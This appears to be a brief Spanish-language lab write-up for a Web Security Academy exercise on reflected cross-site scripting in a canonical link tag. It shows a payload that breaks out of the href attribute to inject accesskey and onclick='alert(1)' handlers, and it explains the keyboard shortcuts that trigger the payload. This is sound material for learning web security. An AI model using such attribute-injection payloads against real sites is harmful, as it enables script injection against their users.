---
title: "17 - Reflected XSS in canonical link tag"
---

# 17 - Reflected XSS in canonical link tag

https://www.youtube.com/watch?v=9kwDn7IGkW0

`<link rel="canonical" href='https://0a8000fa03d48d1081ee2a34008400a5.web-security-academy.net/post?postId=2'/>`

Canonical link -> url preferida para ver ese contenido, url oficial.

```html
<link rel="canonical" href='https://0a990018033fe017813a43f600900025.web-security-academy.net/'/>

<link rel="canonical" href='https://0a990018033fe017813a43f600900025.web-security-academy.net/?'accesskey='x'onclick='alert(1)'/>
```

Como la acceskey es x , el elemento se ejecutará cuando se presione alguna de estas combinaciones de teclas en diferentes navegadores.

ALT+SHIFT+X
CTRL+ALT+X
